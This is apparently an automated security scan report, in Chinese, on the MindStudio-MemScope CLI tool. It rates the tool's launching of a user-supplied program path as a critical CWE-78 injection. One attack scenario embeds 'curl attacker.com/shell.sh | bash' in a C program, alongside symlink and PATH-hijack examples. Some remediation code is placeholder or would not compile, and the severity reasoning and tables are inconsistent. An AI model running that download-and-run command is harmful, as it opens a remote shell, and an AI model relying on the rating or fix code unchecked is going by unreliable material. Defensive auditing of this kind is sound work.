# 漏洞扫描报告 — 已确认漏洞

<!-- EXECUTIVE_SUMMARY -->
## Executive Summary

MindStudio-MemScope 是一个用于 NPU 显存泄漏检测和性能分析的 CLI 工具。本次安全扫描确认了 **1 个 Critical 级别的漏洞**，另有 7 个 LIKELY 和 4 个 POSSIBLE 级别的候选漏洞待进一步确认。

### 核心风险

已确认的 **SEC-003 OS Command Injection** 漏洞位于 `Process::DoLaunch` 函数，攻击者可通过命令行参数直接控制被执行的程序路径，实现任意代码执行。该漏洞存在于工具的核心进程启动逻辑中，影响所有使用该工具进行分析的目标程序。

### 漏洞分布概览

| 严重性 | 数量 | 关键模块 |
|--------|------|----------|
| Critical | 1 | framework (进程启动) |
| High | 2 | framework, kernel_hooks (环境变量注入) |
| Medium | 7 | memory_watch, python_itf, python_hijacker |
| Low | 2 | python_hijacker |

### 攻击路径

攻击者可通过以下路径触发漏洞：
1. **直接攻击**: 通过命令行参数注入恶意程序路径（SEC-003）
2. **环境变量攻击**: 控制 LD_PRELOAD_PATH/ASCEND_HOME_PATH 加载恶意库（SEC-001, SEC-002）
3. **Python API 攻击**: 通过 Python 接口传递恶意参数（SEC-008, SEC-009）

### 安全建议

立即修复 SEC-003 漏洞，对程序路径实施白名单验证。同时建议优先处理 SEC-001 和 SEC-002 环境变量注入问题，防止攻击者加载恶意钩子库。

<!-- END_EXECUTIVE_SUMMARY -->

**项目**: MindStudio-MemScope  
**扫描时间**: 2026-04-20T20:30:00Z  
**报告范围**: 仅包含 CONFIRMED 状态的漏洞

---

## 1. 扫描摘要

### 1.1 验证状态分布

| 状态 | 数量 | 占比 |
|------|------|------|
| LIKELY | 7 | 58.3% |
| POSSIBLE | 4 | 33.3% |
| CONFIRMED | 1 | 8.3% |
| **总计** | **12** | 100% |

### 1.2 严重性分布

| 严重性 | 数量 | 占比 |
|--------|------|------|
| Critical | 1 | 100.0% |
| **有效漏洞总计** | **1** | - |
| 误报 (FALSE_POSITIVE) | 0 | - |

### 1.3 Top 10 关键漏洞

1. **[SEC-003]** OS Command Injection (Critical) - `csrc/framework/process.cpp:226` @ `Process::DoLaunch` | 置信度: 85

---

## 2. 攻击面分析

| 入口点 | 类型 | 信任等级 | 可达性理由 | 说明 |
|--------|------|----------|-----------|------|
| `main@csrc/main.cpp` | cmdline | untrusted_local | 命令行入口，接收用户传入的argc/argv参数，直接解析并执行用户命令 | CLI工具主入口，解析命令行参数并执行分析任务 |
| `PyInit__msmemscope@csrc/python_itf/msleaksmodule.cpp` | decorator | semi_trusted | Python模块初始化，暴露API供Python脚本调用，参数来自Python应用层 | Python C扩展模块入口，注册所有Python API |
| `MsmemscopeConfig@csrc/python_itf/msleaksmodule.cpp` | decorator | untrusted_local | Python config API，接收用户传入的kwargs字典，包含路径、配置参数等 | Python配置接口，设置追踪参数 |
| `MsmemscopeTakeSnapshot@csrc/python_itf/msleaksmodule.cpp` | decorator | untrusted_local | Python快照API，接收用户传入的memory_info字典，包含设备ID、路径等参数 | Python内存快照接口 |
| `PyMemScopeWatcherWatch@csrc/python_itf/watcherobject.cpp` | decorator | untrusted_local | Python watcher API，接收用户传入的tensor对象或addr+size参数 | Python tensor监控接口，添加监控目标 |
| `Process::DoLaunch@csrc/framework/process.cpp` | cmdline | untrusted_local | 使用execvpe执行用户指定的程序路径，程序路径来自命令行参数解析 | 执行目标程序，通过LD_PRELOAD注入钩子库 |
| `Process::SetPreloadEnv@csrc/framework/process.cpp` | env | semi_trusted | 读取环境变量LD_PRELOAD_PATH和ATB_HOME_PATH确定钩子库路径，环境变量可被外部设置 | 设置LD_PRELOAD环境变量注入钩子库 |
| `LibLoad@csrc/event_trace/vallina_symbol.cpp` | env | semi_trusted | 读取ASCEND_HOME_PATH环境变量拼接库路径并dlopen加载，环境变量可被外部控制 | 动态加载Ascend库函数 |
| `InitInjectionMstx@csrc/event_trace/mstx_hooks/mstx_inject.cpp` | rpc | semi_trusted | MSTX注入入口，通过函数指针表注入回调函数，被外部库调用 | MSTX API注入初始化 |
| `JsonManager::LoadFromFile@csrc/utility/json_manager.cpp` | file | untrusted_local | 读取用户指定的JSON配置文件，文件路径来自环境变量MSMEMSCOPE_CONFIG_ENV | 加载JSON配置文件 |
| `hijacker@python/msmemscope/hijacker/hijack_utility.py` | decorator | semi_trusted | Python模块/函数劫持注册，接收模块名、类名、方法名、stub回调函数等参数 | Python函数劫持注册接口 |
| `init_framework_hooks@python/msmemscope/__init__.py` | decorator | semi_trusted | Python框架钩子初始化接口，接收framework/version/component/hook_type参数 | 初始化框架级Python钩子 |
| `RegisterTraceCb@csrc/utility/cpython.cpp` | rpc | semi_trusted | 注册Python trace回调，通过PyEval_SetProfile设置Python解释器profile函数 | 注册Python trace回调函数 |

**其他攻击面**:
- 命令行参数解析 (--input, --output, --watch, --steps等参数路径注入)
- Python API参数 (config/watch/take_snapshot等API的参数)
- 环境变量 (LD_PRELOAD_PATH, ATB_HOME_PATH, ASCEND_HOME_PATH, MSMEMSCOPE_CONFIG_ENV)
- JSON配置文件 ({outputDir}/config.json)
- LD_PRELOAD钩子注入 (libleaks_ascend_hal_hook.so等动态库)
- MSTX API注入 (InitInjectionMstx函数指针表覆盖)
- Python模块劫持 (sys.meta_path注入自定义模块加载器)
- 共享内存IPC (钩子库与主进程的通信)

---

## 3. Critical 漏洞 (1)

### [SEC-003] OS Command Injection - Process::DoLaunch

**严重性**: Critical | **CWE**: CWE-78 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `csrc/framework/process.cpp:226-230` @ `Process::DoLaunch`
**模块**: framework

**描述**: User-provided program path is directly executed via execvpe() without sufficient validation. The program path comes from command line arguments and is resolved via realpath(), but there's no whitelist or ownership validation of the executable path.

---

### 深度分析

#### 漏洞触发路径

```
用户命令行 → main(argc, argv)
           → ClientParser::Parse(argc, argv)
           → userBinCmd = argv[optind:] (非选项参数作为程序名)
           → DoUserCommand(userCommand)
           → Command::Exec()
           → Process::Launch(execParams)
           → ExecCmd cmd(execParams)
           → Process::DoLaunch(cmd)
           → execvpe(cmd.ExecPath(), cmd.ExecArgv(), environ)
```

#### 关键代码分析

**ExecCmd 构造函数** (`process.cpp:42-63`):
```cpp
ExecCmd::ExecCmd(std::vector<std::string> const &args) : path_{}, argc_{0}, args_{args}
{
    if (args_.empty()) {
        return;
    }

    /// filename to absolute path
    char *absPath = realpath(args[0].c_str(), nullptr);
    if (absPath) {
        path_ = std::string(absPath);  // 仅规范化路径，无验证
        free(absPath);
    } else {
        path_ = args[0];  // realpath失败时仍使用原始路径
    }
    // ... 无后续验证
}
```

**Process::DoLaunch** (`process.cpp:226-231`):
```cpp
void Process::DoLaunch(const ExecCmd &cmd) const
{
    // pass all env-vars from global variable "environ"
    execvpe(cmd.ExecPath().c_str(), cmd.ExecArgv(), environ);
    _exit(EXIT_FAILURE);  // execvpe失败时退出
}
```

#### 漏洞原因

1. **无路径验证**: `realpath()` 仅将相对路径转换为绝对路径，不验证路径是否指向可信程序
2. **无所有权检查**: 未检查目标程序是否由可信用户/组拥有
3. **无签名验证**: 未验证目标程序的数字签名或完整性
4. **无白名单机制**: 任何可执行文件均可被启动

#### 攻击场景

**场景 1: 恶意程序执行**
```bash
# 攻击者创建恶意程序
echo 'int main(){ system("curl attacker.com/shell.sh | bash"); }' > /tmp/evil.c
gcc /tmp/evil.c -o /tmp/evil

# 通过 MemScope 执行恶意程序
msmemscope /tmp/evil some_args
```

**场景 2: 符号链接攻击**
```bash
# 攻击者创建指向恶意程序的符号链接
ln -s /malicious/backdoor /tmp/legitimate_name

# 用户尝试执行看似合法的程序
msmemscope /tmp/legitimate_name
```

**场景 3: PATH 环境变量利用**
```bash
# 攻击者在 PATH 中注入恶意目录
export PATH=/malicious:$PATH

# 用户执行程序名（而非路径）
msmemscope python script.py  # 可能执行 /malicious/python
```

#### 影响评估

| 维度 | 评分 | 说明 |
|------|------|------|
| 可达性 | 30/30 | 命令行入口直接可达，无前置验证 |
| 可控性 | 25/25 | 攻击者完全控制程序路径参数 |
| 基础风险 | 30 | OS Command Injection 基础评分 |
| 缓解措施 | 0 | 仅 realpath 规范化，无有效缓解 |

**总分**: 85/100 (Critical)

---

## 4. 模块漏洞分布

| 模块 | Critical | High | Medium | Low | 合计 |
|------|----------|------|--------|-----|------|
| framework | 1 | 0 | 0 | 0 | 1 |
| **合计** | **1** | **0** | **0** | **0** | **1** |

## 5. CWE 分布

| CWE | 数量 | 占比 |
|-----|------|------|
| CWE-78 | 1 | 100.0% |

---

## 6. Remediation Recommendations

### Priority 1 (Critical) — SEC-003 OS Command Injection

**问题**: `Process::DoLaunch` 直接执行用户提供的程序路径，缺乏验证

**修复方案**:

#### 方案 A: 白名单验证（推荐）

```cpp
// process.cpp - 在 ExecCmd 构造函数中添加验证
ExecCmd::ExecCmd(std::vector<std::string> const &args) : path_{}, argc_{0}, args_{args}
{
    if (args_.empty()) {
        throw std::runtime_error("Empty command");
    }

    // 1. 规范化路径
    char *absPath = realpath(args[0].c_str(), nullptr);
    if (!absPath) {
        throw std::runtime_error("Invalid path: " + args[0]);
    }
    std::string resolvedPath(absPath);
    free(absPath);

    // 2. 白名单验证 - 仅允许特定程序
    static const std::set<std::string> ALLOWED_PROGRAMS = {
        "/usr/bin/python",
        "/usr/bin/python3",
        "/usr/local/bin/python",
        // ... 其他可信程序
    };
    
    // 3. 检查是否在白名单中，或属于已知框架
    if (!IsAllowedProgram(resolvedPath)) {
        throw std::runtime_error("Program not in allowed list: " + resolvedPath);
    }

    path_ = resolvedPath;
    // ... 其他初始化
}

bool ExecCmd::IsAllowedProgram(const std::string& path) {
    // 检查白名单
    if (ALLOWED_PROGRAMS.count(path)) {
        return true;
    }
    
    // 检查是否为已签名的 Python 解释器
    if (VerifyPythonSignature(path)) {
        return true;
    }
    
    return false;
}
```

#### 方案 B: 文件所有权验证

```cpp
bool ExecCmd::VerifyFileOwnership(const std::string& path) {
    struct stat st;
    if (stat(path.c_str(), &st) != 0) {
        return false;
    }
    
    // 检查文件属于 root 或可信用户
    if (st.st_uid != 0 && st.st_uid != getuid()) {
        LOG_WARN("File owned by untrusted user: %d", st.st_uid);
        return false;
    }
    
    // 检查不允许 group/world 写权限
    if ((st.st_mode & (S_IWGRP | S_IWOTH)) != 0) {
        LOG_WARN("File is writable by group/others");
        return false;
    }
    
    return true;
}
```

#### 方案 C: 数字签名验证（生产环境推荐）

```cpp
#include <openssl/cms.h>
#include <openssl/pem.h>

bool ExecCmd::VerifySignature(const std::string& path) {
    // 加载可信证书
    X509_STORE* store = LoadTrustedCerts();
    
    // 验证文件签名
    BIO* contentBio = BIO_new_file(path.c_str(), "rb");
    CMS_ContentInfo* cms = CMS_verify(...);
    
    bool valid = CMS_verify(cms, NULL, NULL, store, contentBio, NULL);
    
    // 清理资源
    // ...
    
    return valid;
}
```

---

### Priority 2 (High) — SEC-001/002 环境变量注入

**问题**: LD_PRELOAD_PATH 和 ASCEND_HOME_PATH 直接控制动态库加载路径

**修复方案**:

```cpp
void Process::SetPreloadEnv()
{
    // 使用硬编码的安全路径
    std::string hookLibDir = "/usr/local/lib/msmemscope/";  // 安装时确定
    
    // 禁止环境变量覆盖（生产环境）
    // 如果需要环境变量支持，必须白名单验证
    char const *preloadPath = getenv("LD_PRELOAD_PATH");
    if (preloadPath != nullptr) {
        // 验证路径是否在可信目录下
        std::string resolved = ResolvePath(preloadPath);
        if (!IsInAllowedDir(resolved, "/usr/local/lib/msmemscope/")) {
            LOG_ERROR("LD_PRELOAD_PATH points to untrusted directory");
            return;
        }
    }
    // ...
}
```

---

### Priority 3 (Medium) — SEC-004/010 路径遍历与内存溢出

**问题**: CleanFileName 不处理 `..` 序列，tensor.dataSize 无上限

**修复方案**:

```cpp
// tensor_dumper.cpp
void CleanFileName(std::string& fileName)
{
    // 移除所有路径分隔符
    for (size_t i = 0; i < fileName.size(); i++) {
        if (fileName[i] == '/' || fileName[i] == '\\') {
            fileName[i] = '_';
        }
    }
    
    // 移除 .. 序列（防止路径遍历）
    size_t pos;
    while ((pos = fileName.find("..")) != std::string::npos) {
        fileName.replace(pos, 2, "__");
    }
    
    // 仅保留安全字符
    fileName.erase(std::remove_if(fileName.begin(), fileName.end(), 
        [](char c) { return !std::isalnum(c) && c != '_' && c != '-'; }),
        fileName.end());
}

bool TensorDumper::DumpOneTensor(const MonitoredTensor& tensor, std::string& fileName)
{
    // 添加大小上限验证
    const size_t MAX_TENSOR_SIZE = 1024 * 1024 * 1024;  // 1GB
    if (tensor.dataSize > MAX_TENSOR_SIZE) {
        LOG_ERROR("Tensor size exceeds limit: %zu", tensor.dataSize);
        return false;
    }
    if (tensor.dataSize == 0) {
        LOG_ERROR("Tensor size is zero");
        return false;
    }
    // ... 继续处理
}
```

---

### Priority 4 (Medium) — SEC-008/009 Python API 输入验证

**问题**: PyDict_GetItemString 可能返回 NULL，直接调用 PyLong_AsLong

**修复方案**:

```cpp
// msleaksmodule.cpp
static PyObject* MsmemscopeTakeSnapshot(PyObject* self, PyObject* args)
{
    // ...
    
    // 安全提取字典值
    PyObject* device_obj = PyDict_GetItemString(memory_info, "device");
    if (!device_obj || !PyLong_Check(device_obj)) {
        PyErr_SetString(PyExc_TypeError, "Invalid or missing 'device' parameter");
        return nullptr;
    }
    snapshot_info.device = PyLong_AsLong(device_obj);
    
    PyObject* reserved_obj = PyDict_GetItemString(memory_info, "memory_reserved");
    if (!reserved_obj || !PyLong_Check(reserved_obj)) {
        PyErr_SetString(PyExc_TypeError, "Invalid or missing 'memory_reserved' parameter");
        return nullptr;
    }
    snapshot_info.memory_reserved = PyLong_AsUnsignedLongLong(reserved_obj);
    // ... 其他字段同样处理
}
```

---

## 7. 附录

### 7.1 参考资料

- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-426: Untrusted Search Path](https://cwe.mitre.org/data/definitions/426.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Command Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Command_Injection_Defense_Cheat_Sheet.html)
- [Secure Coding in C and C++ - Robert Seacord](https://www.securecodingincpp.com/)

### 7.2 扫描方法论

本次扫描使用多 Agent 协作模式：
- Architecture Agent: 项目建模和攻击面分析
- DataFlow Scanner: 污点数据流追踪
- Security Auditor: 语义级漏洞识别
- Verification Worker: 漏洞验证和置信度评分

扫描覆盖：
- LSP 可用: ✓
- 总文件数: 131
- 总代码行: 35,000
- 扫描时长: ~2 小时

---

**报告生成时间**: 2026-04-21T04:15:00Z  
**生成者**: Reporter Agent (MindStudio-MemScope Scanner)